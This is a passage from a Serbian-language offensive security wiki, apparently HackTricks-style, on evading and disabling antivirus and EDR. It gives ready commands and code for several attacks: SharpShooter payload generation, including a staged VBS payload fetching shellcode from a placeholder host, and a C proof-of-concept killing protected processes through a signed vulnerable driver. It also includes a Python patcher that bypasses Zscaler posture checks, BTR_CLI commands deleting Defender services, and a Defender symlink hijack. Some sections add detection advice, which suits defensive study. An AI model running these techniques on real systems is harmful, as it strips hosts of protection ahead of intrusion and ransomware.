- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](https://github.com/l0ss/Grouper2)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Primer korišćenja Pythona za pravljenje injectora:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Ostali alati

```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```

### Još

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Gašenje AV/EDR-a iz kernel prostora

Storm-2603 je koristio mali konzolni alat poznat kao **Antivirus Terminator** da onemogući zaštitu krajnjih tačaka pre nego što postavi ransomware. Alat donosi **sopstveni ranjivi, ali *potpisani* driver** i zloupotrebljava ga za izvršavanje privilegovanih operacija u kernelu koje ne mogu da blokiraju čak ni AV servisi zaštićeni pomoću Protected-Process-Light (PPL).<sup>[[12]](#references)</sup>

Ključne stavke
1. **Potpisani driver**: Datoteka koja se isporučuje na disk je `ServiceMouse.sys`, ali binarna datoteka je legitimno potpisani driver `AToolsKrnl64.sys` iz Antiy Labs alata „System In-Depth Analysis Toolkit“. Pošto driver ima važeći Microsoft potpis, učitava se čak i kada je Driver-Signature-Enforcement (DSE) omogućen.
2. **Instalacija servisa**:
   ```powershell
   sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
   sc start  ServiceMouse
   ```
   Prva linija registruje drajver kao **kernel servis**, a druga ga pokreće tako da `\\.\ServiceMouse` postane dostupan iz korisničkog prostora.
3. **IOCTL-ovi koje drajver izlaže**
   | IOCTL kod   | Mogućnost                              |
   |-----------:|-----------------------------------------|
   | `0x99000050` | Prekinuti proizvoljan proces prema PID-u (koristi se za zaustavljanje Defender/EDR servisa) |
   | `0x990000D0` | Obrisati proizvoljnu datoteku sa diska |
   | `0x990001D0` | Osloboditi drajver i ukloniti servis |

   Minimalni C proof-of-concept:
   ```c
   #include <windows.h>
   
   int main(int argc, char **argv){
       DWORD pid = strtoul(argv[1], NULL, 10);
       HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
       DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
       CloseHandle(hDrv);
       return 0;
   }
   ```
4. **Zašto funkcioniše**: BYOVD u potpunosti zaobilazi zaštite korisničkog režima; kod koji se izvršava u kernelu može da otvori *zaštićene* procese, prekine ih ili menja kernel objekte, bez obzira na PPL/PP, ELAM ili druge funkcije za ojačavanje zaštite.

Otkrivanje / ublažavanje rizika
•  Omogućite Microsoftovu listu blokiranih ranjivih drajvera (`HVCI`, `Smart App Control`) kako bi Windows odbio da učita `AToolsKrnl64.sys`.
•  Pratite kreiranje novih *kernel* servisa i upozorite kada se drajver učita iz direktorijuma sa dozvolom upisa za sve korisnike ili nije na listi dozvoljenih.
•  Pratite handle-ove iz korisničkog režima ka prilagođenim objektima uređaja, a zatim i sumnjive pozive `DeviceIoControl`.

### Zaobilaženje provera stanja uređaja u Zscaler Client Connector-u zakrpom binarnih datoteka na disku

Zscalerov **Client Connector** lokalno primenjuje pravila stanja uređaja i oslanja se na Windows RPC za prosleđivanje rezultata drugim komponentama. Dva slaba izbora u dizajnu omogućavaju potpuno zaobilaženje:

1. Provera stanja uređaja se obavlja **u potpunosti na klijentskoj strani** (serveru se šalje logička vrednost).
2. Interne RPC krajnje tačke proveravaju samo da li je izvršna datoteka koja se povezuje **potpisana od strane Zscaler-a** (putem `WinVerifyTrust`).<sup>[[11]](#references)</sup>

Zakrpom **četiri potpisane binarne datoteke na disku** moguće je neutralisati oba mehanizma:

| Binarna datoteka | Originalna logika koja se zakrpljuje | Rezultat |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Uvek vraća `1`, pa svaka provera pokazuje usklađenost |
| `ZSAService.exe` | Indirektni poziv funkcije `WinVerifyTrust` | NOP-ed ⇒ bilo koji proces (čak i nepotpisan) može da se poveže sa RPC cevima |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Zamenjuje se sa `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Provere integriteta tunela | Preskaču se |

Minimalni isečak patcher-a:

```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
    data = f.read()
    off = data.find(pattern)
    if off == -1:
        print("pattern not found")
    else:
        f.seek(off)
        f.write(replacement)
```

Nakon zamene originalnih datoteka i ponovnog pokretanja servisnog steka:

* **Sve** provere stanja prikazuju **zeleno/usaglašeno**.
* Nepotpisani ili izmenjeni binarni fajlovi mogu da otvore RPC krajnje tačke imenovanih cevi (npr. `\\RPC Control\\ZSATrayManager_talk_to_me`).
* Kompromitovani host dobija neograničen pristup internoj mreži definisanoj Zscaler pravilima.

Ova studija slučaja pokazuje kako se odluke o poverenju donete isključivo na strani klijenta i jednostavne provere potpisa mogu zaobići sa nekoliko izmena bajtova.

## Zloupotreba pouzdane funkcionalnosti Microsoft Defender `BTR.sys`

Defenderov drajver **Boot-Time Removal** koristan je primer koji se razlikuje od klasičnog BYOVD-a. `BTR.sys` je legitimna Microsoft-ova komponenta za sanaciju, potpisana bezbednosnim potpisom, bez greške korupcije memorije i bez IOCTL interfejsa; nakon sticanja administratorskog pristupa i privilegije `SeLoadDriverPrivilege`, operater može umesto toga da falsifikuje njegovu privatnu transakciju sanacije i dobije predviđene Ring-0 operacije nad datotekama i registrima. Ovo je **primitiva za neutralisanje AV/EDR-a nakon kompromitacije, a ne za početni pristup ili eskalaciju privilegija**, a drajver se može izdvojiti iz resursa `BOOTTIMETOOL` u ciljnom `MpEngine.dll`, umesto da se uveze upadljiv drajver treće strane.<sup>[[36]](#references)</sup>

### Priprema jednokratnog drajvera

Defender obično izbacuje resurs kao datoteku nasumičnog imena `[a-z]{8}.sys` i registruje kernel servis sličnog imena. `DriverEntry` čita vrednost `Args` servisa, otvara navedeni NTFS ADS, dešifruje i proverava listu radnji, zapisuje povратne informacije i nakon uspešnog izvršavanja vraća `0xC0000056` (`STATUS_DELETE_PENDING`), čime se drajver učitava sa sistema umesto da ostane rezidentan. Falsifikovani servis ima sledeće karakteristične vrednosti.<sup>[[36]](#references)[[37]](#references)</sup>

```text
Type         = 1
Start        = 1
ErrorControl = 0
ImagePath    = \??\C:\Windows\System32\drivers\<random>.sys
Group        = Boot Bus Extender
Args         = C:\Windows\System32\drivers\<random>.sys:changelist
```

`:changelist` stream sadrži jedan blob šifrovan RC4-om. Analizirane verzije ponovo koriste fiksni ključ od 256 bajtova, tako da šifrovanje nije granica autorizacije. Važeći plaintext ima globalno zaglavlje od 24 bajta (`Magic=0xFEE1DEAD`, `Version=2`, `PayloadOffset=0x10`, CRC zaglavlja i ID transakcije izveden iz payload-a), iza kojeg slede null-terminated UTF-16 putanja za povratne informacije i proizvoljan broj stavki. Svaka stavka ima zaglavlje od 16 bajtova (`DataSize`, `Action`, `HeaderCRC`, `DataCRC`) i podatke specifične za akciju koji se završavaju sa **tačno četiri NUL bajta**. Svaki region zaglavlja/podataka proverava se nezavisno pomoću CRC-32 polinoma `0xEDB88320`, početnog stanja `0xFFFFFFFF` i **bez završnog XOR-a** (`~CRC32`); CRC stanje se resetuje za svaki region.<sup>[[36]](#references)[[37]](#references)</sup>

Prihvaćeni ID-jevi akcija omogućavaju sledeće kernel primitive.<sup>[[36]](#references)[[37]](#references)</sup>

| ID | Podaci stavke | Rezultat |
| --- | --- | --- |
| 1 | `[UTF-16 path]` | Brisanje datoteke, uključujući zaključanu datoteku |
| 2 | `[UTF-16 path]` | Uklanjanje praznog direktorijuma |
| 3 | `[Flags][source][destination]` | Premeštanje datoteke na zaštićenu putanju koju je izabrao napadač; prazno odredište znači brisanje |
| 4 | `[Flags][key path]` | Rekurzivno brisanje registry ključa |
| 5 | `[Flags][key path + "\\" + value]` | Brisanje registry vrednosti |
| 6 | `[Flags][type][size][key path + "\\" + value][data]` | Kreiranje/ažuriranje registry vrednosti i kreiranje nedostajućih putanja ključeva |

Kod akcija 5 i 6, separator ključa/vrednosti na žici sastoji se od **dve uzastopne obrnute kose crte**; konvencionalno formatirana putanja neće biti ispravno razdvojena. Datoteka za povratne informacije uglavnom preslikava zahtev, ali prva četiri bajta podataka svake stavke postaju njen rezultat `NTSTATUS`. Kod akcija 1 i 2, koje nemaju početno polje flags, BTR premešta putanju u četiri rezervisana završna bajta kako bi napravio prostor za taj status.<sup>[[36]](#references)</sup>

### Tok rada `BTR_CLI` i period ranog pokretanja

[`BTR_CLI`](https://github.com/Dump-GUY/BTR_CLI) sprovodi ceo lanac: izdvaja `BTR.sys` iz lokalnog Defender-a, kreira `<random>.sys:changelist` i stream za povratne informacije, serijalizuje/potpisuje kontrolnim sumama/šifruje povezane akcije, direktno kreira service registry ključ, a zatim poziva `NtLoadDriver` za `-trigger now` ili ostavlja drajver kao drajver koji se pokreće pri startovanju sistema za `-trigger boot`. Direktno postavljanje u registry izbegava uobičajeni SCM `CreateServiceW` put i zato **ne** generiše Event ID 7045 za instalaciju servisa. Artefakti pokrenuti pri podizanju sistema mogu se kasnije ukloniti komandom `BTR_CLI.exe -cleanup <service_name>`.<sup>[[36]](#references)[[37]](#references)</sup>

```powershell
# Runtime: remove protected security-service registrations from Ring 0
BTR_CLI.exe -chain -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WdFilter" -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WinDefend" -trigger now

# Boot: delete a security driver before its user-mode protection stack starts
BTR_CLI.exe -a 1 -s "C:\Windows\System32\drivers\wd\WdFilter.sys" -trigger boot
```

`Start=0` nije upotrebljiv jer BTR obavlja I/O nad datotekama iz `DriverEntry` pre nego što storage stack i veza `SystemRoot` budu spremni. `Start=1` uz grupu visokog prioriteta `Boot Bus Extender` umesto toga pokreće izvršavanje u Phase 1: NTFS je upotrebljiv, ali mnogi bezbednosni drajveri koji se pokreću pri startovanju sistema i EDR servisi u user-mode još nisu inicijalizovani. Boot-start filteri kao što je `WdFilter` možda su već učitani, ali BTR može da ukloni njihove binarne datoteke ili konfiguraciju servisa pre sledećeg pokretanja, kao i da obriše izvršne datoteke servisa pre nego što ih SCM pokrene. ELAM ne zatvara ovaj jaz jer se BTR pokreće nakon procene boot-start komponenti i ima važeći Microsoft potpis.<sup>[[36]](#references)</sup>

Više radnji izvršava se u jednoj transakciji. PoC dodaje Action 1 na početak za unapred definisanu putanju `\SystemRoot\Temp\BootClean.log`: BTR kreira ovaj log, zatim obradi sopstveni zahtev za brisanje i ukloni ga pre isključivanja. Time se smanjuje količina dokaza, a čuvanje povratnih informacija u `<random>.sys:<random>.dat` omogućava uklanjanje drajvera i oba toka zajedno.<sup>[[36]](#references)[[37]](#references)</sup>

### Korelacije za detekciju visokog značaja

Pravila zasnovana samo na potpisima i Microsoftova blocklist lista ranjivih drajvera ne rešavaju zloupotrebu predviđene BTR funkcionalnosti. Dajte prednost sledećim korelacijama ponašanja, uz razlikovanje legitimnog Defender porekla od proizvoljnog pokretača.<sup>[[36]](#references)</sup>

- **Sysmon 15:** Kreiranje `.sys:changelist` univerzalno je za BTR staging. ADS `.dat` pridružen istoj `.sys` datoteci naročito je sumnjiv jer legitimni Defender obično čuva povratne informacije ispod `C:\ProgramData\Microsoft\Windows Defender\Scans\RebootActions\`.
- **Sysmon 12/13 bez System 7045:** Korelišite direktno kreiranje `HKLM\SYSTEM\CurrentControlSet\Services\<random>` koje sadrži `Args=...:changelist` i `Group=Boot Bus Extender`, a nema odgovarajući SCM događaj instalacije.
- **Sysmon 6 -> 23:** Korelišite učitavanje poznatog BTR drajvera koji nije pokrenut kroz Defender poreklo sa naknadnim brisanjem datoteka koje se pripisuje procesu `System`/PID 4, naročito ako su u pitanju bezbednosne binarne datoteke.
- **Sysmon 11 -> 23:** Upozorite na brzo kreiranje i brisanje `\SystemRoot\Temp\BootClean.log` od strane procesa `System`/PID 4.
- Ograničite i nadzirite dodeljivanje/omogućavanje privilegije `SeLoadDriverPrivilege`; sam Microsoft potpis nije dovoljan razlog za poverenje kada se drajver bezbednosnog alata priprema pomoću `cmd.exe`, PowerShell-a ili nepoznatog procesa.

## Zloupotreba Protected Process Light (PPL) radi neovlašćenog menjanja AV/EDR-a pomoću LOLBIN-ova

Protected Process Light (PPL) sprovodi hijerarhiju potpisnika/nivoa, tako da samo zaštićeni procesi istog ili višeg nivoa mogu da menjaju jedni druge. U ofanzivnom kontekstu, ako možete legitimno da pokrenete binarnu datoteku sa omogućenim PPL-om i da kontrolišete njene argumente, benignu funkcionalnost (npr. beleženje) možete da pretvorite u ograničen mehanizam za upisivanje, zaštićen pomoću PPL-a, u zaštićene direktorijume koje koriste AV/EDR.<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)[[20]](#references)</sup>

Šta omogućava pokretanje procesa kao PPL
- Ciljna EXE datoteka (i sve učitane DLL datoteke) mora biti potpisana EKU-om koji podržava PPL.
- Proces se mora kreirati pomoću CreateProcess uz zastavice: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- Mora se zatražiti kompatibilan ниво защиты, који одговара потписнику бинарне датотеке (нпр. `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` за потписнике anti-malware-а, `PROTECTION_LEVEL_WINDOWS` за Windows потписнике). Погрешни нивои довешће до неуспешног креирања процеса.

Погледајте и шири увод у PP/PPL и LSASS заштиту овде:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Алати за покретање
- Помоћни алат отвореног кода: CreateProcessAsPPL (бира ниво заштите и прослеђује аргументе циљној EXE датотеци):
  - [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)<sup>[[19]](#references)</sup>
- Начин коришћења:

```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```

LOLBIN primitive: ClipUp.exe
- Potpisani sistemski binarni fajl `C:\Windows\System32\ClipUp.exe` sam pokreće novu instancu i prihvata parametar za upisivanje log fajla na putanju koju zada pozivalac.
- Kada se pokrene kao PPL proces, fajl se upisuje uz PPL zaštitu.
- ClipUp ne može da obradi putanje koje sadrže razmake; koristite kratke 8.3 putanje za pristup lokacijama koje su obično zaštićene.

Pomoćne funkcije za kratke 8.3 putanje
- Prikaz kratkih naziva: `dir /x` u svakom roditeljskom direktorijumu.
- Izvođenje kratke putanje u cmd: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Lanac zloupotrebe (apstraktno)
1) Pokrenite LOLBIN koji podržava PPL (ClipUp) sa `CREATE_PROTECTED_PROCESS` pomoću pokretača (npr. CreateProcessAsPPL).
2) Prosledite ClipUp argument za putanju log fajla kako biste primorali kreiranje fajla u zaštićenom AV direktorijumu (npr. Defender Platform). Po potrebi koristite kratke 8.3 nazive.
3) Ako AV obično drži ciljnu binarnu datoteku otvorenom/zaključanom dok radi (npr. MsMpEng.exe), zakažite upis pri pokretanju sistema, pre nego što se AV pokrene, tako što ćete instalirati uslugu za automatsko pokretanje koja se pouzdano pokreće ranije. Proverite redosled pokretanja pomoću Process Monitor-a (zapisivanje pri pokretanju sistema).
4) Pri ponovnom pokretanju, upis uz PPL zaštitu se obavlja pre nego što AV zaključa svoje binarne datoteke, čime se oštećuje ciljna datoteka i sprečava pokretanje AV-a.

Primer poziva (putanje su uklonjene/skraćene iz bezbednosnih razloga):

```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```

Napomene i ograničenja
- Ne možete da kontrolišete sadržaj koji ClipUp upisuje, već samo lokaciju; ova primitiva je pogodna za korupciju, a ne za precizno ubacivanje sadržaja.
- Potrebna su lokalna administratorska/SYSTEM prava za instaliranje/pokretanje servisa, kao i period za ponovno pokretanje sistema.
- Tajming je ključan: ciljna datoteka ne sme biti otvorena; izvršavanje pri pokretanju sistema izbegava zaključavanje datoteke.

Detekcije
- Kreiranje procesa `ClipUp.exe` sa neuobičajenim argumentima, naročito ako ga pokreću nestandardni programi, u vreme pokretanja sistema.
- Novi servisi konfigurisani za automatsko pokretanje sumnjivih binarnih datoteka, koji se redovno pokreću pre Defender/AV-a. Istražite kreiranje/izmenu servisa pre neuspešnog pokretanja Defender-a.
- Nadzor integriteta datoteka Defender-a/direktorijuma Platform; neočekivano kreiranje/izmena datoteka od strane procesa sa zastavicama za zaštićene procese.
- ETW/EDR telemetrija: tražite procese pokrenute sa `CREATE_PROTECTED_PROCESS` i anomalnu upotrebu PPL nivoa kod binarnih datoteka koje nisu AV.

Ublažavanja
- WDAC/Code Integrity: ograničite koje potpisane binarne datoteke mogu da se pokreću kao PPL i pod kojim roditeljskim procesima; blokirajte pozivanje ClipUp-a van legitimnog konteksta.
- Higijena servisa: ograničite kreiranje/izmenu servisa koji se automatski pokreću i nadgledajte manipulisanje redosledom pokretanja.
- Uverite se da su zaštita od neovlašćenih izmena Defender-a i zaštite pri ranom pokretanju omogućene; istražite greške pri pokretanju koje ukazuju na oštećenje binarne datoteke.
- Razmotrite onemogućavanje generisanja kratkih 8.3 imena na volumenima na kojima se nalaze bezbednosni alati, ako je to kompatibilno sa vašim okruženjem (temeljno testirajte).

## Neovlašćena izmena Microsoft Defender-a putem otmice simboličke veze do fascikle verzije Platform

Windows Defender bira platformu sa koje se pokreće tako što nabraja podfascikle u:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

Bira podfasciklu sa leksikografski najvećim nizom verzije (npr. `4.18.25070.5-0`), a zatim odatle pokreće procese servisa Defender-a (uz odgovarajuće ažuriranje putanja servisa/registra). Ovaj izbor prihvata unose direktorijuma, uključujući tačke za ponovno tumačenje direktorijuma (simboličke veze). Administrator to može iskoristiti da preusmeri Defender na putanju u koju napadač može da upisuje i postigne DLL sideloading ili prekid rada servisa.<sup>[[21]](#references)[[22]](#references)</sup>

Preduslovi
- Lokalni administrator (potrebno za kreiranje direktorijuma/simboličkih veza u fascikli Platform)
- Mogućnost ponovnog pokretanja sistema ili pokretanja ponovnog izbora platforme Defender-a (ponovno pokretanje servisa pri pokretanju sistema)
- Potrebni su samo ugrađeni alati (`mklink`)

Zašto funkcioniše
- Defender blokira upisivanje u sopstvene fascikle, ali njegov izbor platforme prihvata unose direktorijuma i bira leksikografski najveću verziju bez provere da li se cilj razrešava u zaštićenu/pouzdanu putanju.

Korak po korak (primer)
1) Pripremite upisivu kopiju trenutne fascikle platforme, npr. `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Kreirajte direktorijumski symlink sa višom verzijom unutar Platform, koji pokazuje na vašu fasciklu:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Izbor okidača (preporučuje se ponovno pokretanje):
```cmd
shutdown /r /t 0
```
4) Proverite da li se MsMpEng.exe (WinDefend) pokreće sa preusmerene putanje:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
Post-exploitation options
- DLL sideloading/code execution: Ubacite/zamenite DLL-ove koje Defender učitava iz direktorijuma svoje aplikacije da biste izvršili kod u Defender-ovim procesima. Pogledajte gornji odeljak: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Service kill/denial: Uklonite version-symlink kako se konfigurisana putanja pri sledećem pokretanju ne bi razrešila i Defender ne bi uspeo da se pokrene:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```

> [!TIP]
> Imajte na umu da ova tehnika sama po sebi ne omogućava eskalaciju privilegija; potrebna su administratorska prava.

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

Red timovi mogu da premeste runtime evasion iz C2 implant-a u sam ciljni modul tako što će zakačiti njegovu Import Address Table (IAT) i usmeriti odabrane API-je kroz position-independent code (PIC) pod kontrolom napadača. Time se evasion proširuje izvan malog skupa API-ja koje mnogi kit-ovi izlažu (npr. CreateProcessA), a ista zaštita primenjuje se i na BOF-ove i post-exploitation DLL-ove.<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup>

Pristup na visokom nivou
- Postavite PIC blob uz ciljni modul pomoću reflective loader-a (ispred njega ili kao prateći fajl). PIC mora biti samostalan i position-independent.
- Dok se host DLL učitava, prođite kroz njegov IMAGE_IMPORT_DESCRIPTOR i izmenite IAT unose za ciljane importe (npr. CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc) tako da pokazuju na tanke PIC wrapper-e.
- Svaki PIC wrapper izvršava evasion pre nego što poziv prosledi stvarnoj adresi API-ja. Uobičajeni evasion postupci uključuju:
  - Maskiranje/demaskiranje memorije oko poziva (npr. šifrovanje beacon region-a, RWX→RX, promena naziva/dozvola stranica), a zatim vraćanje stanja nakon poziva.
  - Call-stack spoofing: napravite benigni stek i pređite na ciljni API tako da analiza call-stack-a razreši očekivane frejmove.<sup>[[9]](#references)</sup>
- Radi kompatibilnosti, izvezite interfejs kako bi Aggressor skripta (ili ekvivalent) mogla da registruje API-je koje treba zakačiti za Beacon, BOF-ove i post-exploitation DLL-ove.

Zašto ovde koristiti IAT hooking
- Radi za svaki kod koji koristi zakačeni import, bez menjanja koda alata i bez oslanjanja na Beacon da posreduje u pozivima određenih API-ja.
- Obuhvata post-exploitation DLL-ove: zakačivanje LoadLibrary* omogućava presretanje učitavanja modula (npr. System.Management.Automation.dll, clr.dll) i primenu istog maskiranja/stack evasion postupka na njihove API pozive.
- Omogućava pouzdano korišćenje post-exploitation komandi koje pokreću procese, a koje ciljaju detekcije zasnovane na call-stack-u, tako što se CreateProcessA/W obavije wrapper-om.

Minimalni prikaz IAT hook-a (x64 pseudokod za C/C++)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Napomene
- Primeni zakrpu nakon relocations/ASLR, a pre prve upotrebe importa. Reflective loader-i kao što su TitanLdr/AceLdr pokazuju hookovanje tokom DllMain učitanog modula.
- Wrapper-i treba da budu mali i bezbedni za PIC; pravu API funkciju pronađi preko originalne IAT vrednosti koju si sačuvao pre zakrpe ili pomoću LdrGetProcedureAddress.
- Za PIC koristi prelaze RW → RX i izbegavaj da stranice ostanu istovremeno upisive i izvršne.

Call-stack spoofing stub
- PIC stub-ovi u Draugr stilu prave lažni lanac poziva (povratne adrese unutar benignih modula), a zatim prelaze u pravu API funkciju.
- Time se zaobilaze detekcije koje očekuju kanonske stekove od Beacon/BOF-ova do osetljivih API funkcija.
- Kombinuj sa tehnikama stack cutting/stack stitching da bi stigao do očekivanih frejmova pre prologa API funkcije.

Operativna integracija
- Dodaj reflective loader na početak post-ex DLL-ova da bi se PIC i hook-ovi automatski inicijalizovali pri učitavanju DLL-a.
- Koristi Aggressor script za registraciju ciljnih API funkcija kako bi Beacon i BOF-ovi transparentno koristili isti put za zaobilaženje detekcije, bez izmena koda.

Razmatranja za detekciju/DFIR
- Integritet IAT-a: stavke koje upućuju na adrese koje nisu deo image-a (heap/anon); periodična provera import pokazivača.
- Anomalije steka: povratne adrese koje ne pripadaju učitanim image-ima; nagli prelazi na PIC koji nije deo image-a; nedosledno poreklo iz RtlUserThreadStart.
- Telemetrija loader-a: upisi u IAT unutar procesa, rana aktivnost DllMain koja menja import thunk-ove, neočekivane RX oblasti nastale pri učitavanju.
- Zaobilaženje image-load detekcije: ako hookuješ LoadLibrary*, nadgledaj sumnjiva učitavanja automation/clr sklopova povezana sa događajima maskiranja memorije.

Povezani gradivni elementi i primeri
- Reflective loader-i koji tokom učitavanja obavljaju IAT patching (npr. TitanLdr, AceLdr)
- Memory masking hook-ovi (npr. simplehook) i stack-cutting PIC (stackcutting)
- PIC call-stack spoofing stub-ovi (npr. Draugr)


## Import-Time IAT Hooking + Sleep Obfuscation (Crystal Palace/PICO)

### IAT hook-ovi u vreme importa preko rezidentnog PICO-a

Ako kontrolišeš reflective loader, možeš da hookuješ importe **tokom** `ProcessImports()` tako što ćeš pokazivač `GetProcAddress` u loader-u zameniti prilagođenim resolver-om koji prvo proverava hook-ove:<sup>[[6]](#references)[[7]](#references)[[8]](#references)</sup>

- Napravi **rezidentni PICO** (perzistentni PIC objekat) koji opstaje nakon što se prolazni loader PIC oslobodi.
- Izvezi funkciju `setup_hooks()` koja prepisuje import resolver loader-a (npr. `funcs.GetProcAddress = _GetProcAddress`).
- U `_GetProcAddress` preskoči ordinal importe i koristi hook lookup zasnovan na hash-u, kao što je `__resolve_hook(ror13hash(name))`. Ako hook postoji, vrati ga; u suprotnom pozovi pravi `GetProcAddress`.
- Registruj ciljeve hook-ova u vreme linkovanja pomoću stavki Crystal Palace `addhook "MODULE$Func" "hook"`. Hook ostaje važeći jer se nalazi unutar rezidentnog PICO-a.

Tako se postiže **IAT redirection u vreme importa** bez patchovanja code sekcije učitanog DLL-a nakon učitavanja.

### Forsiranje hookable importa kada cilj koristi PEB-walking

Hook-ovi u vreme importa aktiviraju se samo ako se funkcija zaista nalazi u IAT-u cilja. Ako modul razrešava API funkcije pomoću PEB-walk + hash-a (bez import stavke), forsiraj pravi import kako bi loader-ov put `ProcessImports()` mogao da ga obradi:

- Zameni razrešavanje export-a pomoću hash-a (npr. `GetSymbolAddress(..., HASH_FUNC_WAIT_FOR_SINGLE_OBJECT)`) direktnom referencom kao što je `&WaitForSingleObject`.
- Kompajler će generisati IAT stavku, što omogućava presretanje dok reflective loader razrešava importe.

### Sleep/idle obfuskacija u Ekko stilu bez patchovanja `Sleep()`

Umesto patchovanja `Sleep`, hookuj **stvarne primitivne funkcije za čekanje/IPC** koje implant koristi (`WaitForSingleObject(Ex)`, `WaitForMultipleObjects`, `ConnectNamedPipe`). Za duga čekanja obmotaј poziv Ekko-style obfuscation chain-om koji šifruje image u memoriji tokom mirovanja:<sup>[[31]](#references)[[27]](#references)</sup>

- Koristi `CreateTimerQueueTimer` da zakažeš niz callback-ova koji pozivaju `NtContinue` sa pripremljenim `CONTEXT` frejmovima.
- Uobičajeni lanac (x64): postavi image na `PAGE_READWRITE` → šifruj RC4 pomoću `advapi32!SystemFunction032` preko celog mapiranog image-a → izvrši blokirajuće čekanje → dešifruj RC4 → **vrati dozvole za svaku sekciju** obilaskom PE sekcija → signaliziraj završetak.
- `RtlCaptureContext` obezbeđuje predložak `CONTEXT`; kloniraj ga u više frejmova i podesi registre (`Rip/Rcx/Rdx/R8/R9`) da pozovu svaki korak.

Operativni detalj: vrati „success“ za duga čekanja (npr. `WAIT_OBJECT_0`) kako bi pozivalac nastavio dok je image maskiran. Ovaj obrazac skriva modul od skenera tokom perioda mirovanja i izbegava prepoznatljiv potpis klasičnog „patched `Sleep()`“.

Ideje za detekciju (zasnovane na telemetriji)
- Nizovi callback-ova `CreateTimerQueueTimer` koji upućuju na `NtContinue`.
- `advapi32!SystemFunction032` upotrebljen nad velikim, neprekinutim baferima veličine image-a.
- `VirtualProtect` nad velikim opsegom, posle čega sledi prilagođeno vraćanje dozvola za svaku sekciju.

### CFG registracija gadget-a za sleep-obfuscation tokom rada

